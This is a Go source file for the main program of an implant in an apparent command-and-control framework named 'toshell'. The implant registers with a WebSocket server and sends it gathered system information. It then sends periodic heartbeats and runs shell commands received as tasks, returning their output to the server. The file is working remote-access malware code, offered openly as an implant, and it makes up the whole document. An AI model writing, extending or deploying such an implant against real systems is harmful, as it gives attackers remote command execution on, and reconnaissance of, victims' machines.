package main

import (
	"crypto/rand"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"time"

	"toshell/internal/common/crypto"
	"toshell/internal/common/protocol"
	"toshell/internal/implant/config"
	"toshell/internal/implant/executor"
	"toshell/internal/implant/sysinfo"
	"toshell/internal/implant/transport"
)

type Implant struct {
	config     *config.Config
	transport   transport.Transport
	executor    executor.Executor
	sessionID   string
	hostKey     string
	running     bool
}

func main() {
	// 解析命令行参数
	serverURL := flag.String("server", "ws://localhost:8080", "WebSocket server URL")
	flag.Parse()

	cfg := loadConfig(*serverURL)

	impl := New(cfg)
	if err := impl.Run(); err != nil {
		fmt.Fprintf(os.Stderr, "Implant error: %v\n", err)
		os.Exit(1)
	}
}

func loadConfig(serverURL string) *config.Config {
	cfg := config.Default()
	cfg.ServerURL = serverURL
	cfg.Interval = 60
	cfg.Jitter = 10
	return cfg
}

func New(cfg *config.Config) *Implant {
	trans, err := transport.NewWebSocketTransport(cfg.ServerURL)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed to create transport: %v\n", err)
		os.Exit(1)
	}

	exec := executor.NewShellExecutor()

	hostKey := cfg.HostKey
	if hostKey == "" {
		key, _ := crypto.GenerateRandomBytes(16)
		hostKey = fmt.Sprintf("%x", key)
	}

	sessionID := generateSessionID()

	return &Implant{
		config:     cfg,
		transport:   trans,
		executor:    exec,
		sessionID:   sessionID,
		hostKey:     hostKey,
		running:     false,
	}
}

func (i *Implant) Run() error {
	i.running = true

	if err := i.register(); err != nil {
		return fmt.Errorf("registration failed: %w", err)
	}

	go i.heartbeatLoop()

	i.taskLoop()

	return nil
}

func (i *Implant) register() error {
	sysInfo, err := sysinfo.Gather()
	if err != nil {
		return err
	}

	reg := sysInfo.ToRegister()
	regData, err := json.Marshal(reg)
	if err != nil {
		return err
	}

	packet := &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      protocol.TypeRegister,
		ID:        i.getPacketID(),
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   regData,
	}

	packet.Length = uint32(len(packet.Payload))

	fmt.Printf("[INFO] [implant] Sending registration packet...\n")
	if err := i.transport.Send(packet); err != nil {
		fmt.Printf("[ERROR] [implant] Failed to send registration packet: %v\n", err)
		return err
	}

	fmt.Printf("[INFO] [implant] Registration packet sent successfully\n")

	// 等待服务器响应
	fmt.Printf("[INFO] [implant] Waiting for server response...\n")
	response, err := i.transport.Receive()
	if err != nil {
		fmt.Printf("[ERROR] [implant] Failed to receive server response: %v\n", err)
		return err
	}

	fmt.Printf("[INFO] [implant] Received server response: %v\n", response)

	return nil
}

func (i *Implant) heartbeatLoop() {
	ticker := time.NewTicker(i.transport.GetInterval())
	defer ticker.Stop()

	for i.running {
		<-ticker.C

		if err := i.sendHeartbeat(); err != nil {
			fmt.Fprintf(os.Stderr, "Heartbeat error: %v\n", err)
		}
	}
}

func (i *Implant) sendHeartbeat() error {
	hb := &protocol.Heartbeat{
		Status: "active",
	}

	_, used := sysinfo.GetMemoryInfo()
	hb.MemoryUsed = used

	hbData, err := json.Marshal(hb)
	if err != nil {
		return err
	}

	packet := &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      protocol.TypeHeartbeat,
		ID:        i.getPacketID(),
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   hbData,
	}

	packet.Length = uint32(len(packet.Payload))

	return i.transport.Send(packet)
}

func (i *Implant) taskLoop() {
	for i.running {
		packet, err := i.transport.Receive()
		if err != nil {
			fmt.Fprintf(os.Stderr, "Receive error: %v\n", err)
			time.Sleep(5 * time.Second)
			continue
		}

		if packet == nil {
			continue
		}

		switch packet.Type {
		case protocol.TypeTask:
			i.handleTask(packet)
		case protocol.TypeAck:
		default:
		}
	}
}

func (i *Implant) handleTask(packet *protocol.Packet) {
	var task protocol.Task
	if err := json.Unmarshal(packet.Payload, &task); err != nil {
		fmt.Fprintf(os.Stderr, "Failed to parse task: %v\n", err)
		return
	}

	result, err := i.executor.Execute(task.Command, task.Args, task.Timeout)
	if err != nil {
		result = &executor.ExecutionResult{
			ExitCode: -1,
			Error:    err.Error(),
		}
	}

	resultPacket := &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      protocol.TypeResult,
		ID:        i.getPacketID(),
		Timestamp: uint64(time.Now().UnixMilli()),
	}

	resultData, _ := json.Marshal(protocol.Result{
		TaskID:   task.ID,
		ExitCode: result.ExitCode,
		Output:   result.Output,
		Error:    result.Error,
	})

	resultPacket.Payload = resultData
	resultPacket.Length = uint32(len(resultData))

	i.transport.Send(resultPacket)
}

func (i *Implant) getPacketID() uint64 {
	var b [8]byte
	rand.Read(b[:])
	return binary.BigEndian.Uint64(b[:])
}

func generateSessionID() string {
	b, _ := crypto.GenerateRandomBytes(8)
	return fmt.Sprintf("%x", b)
}

func (i *Implant) Stop() {
	i.running = false
	i.transport.Close()
}
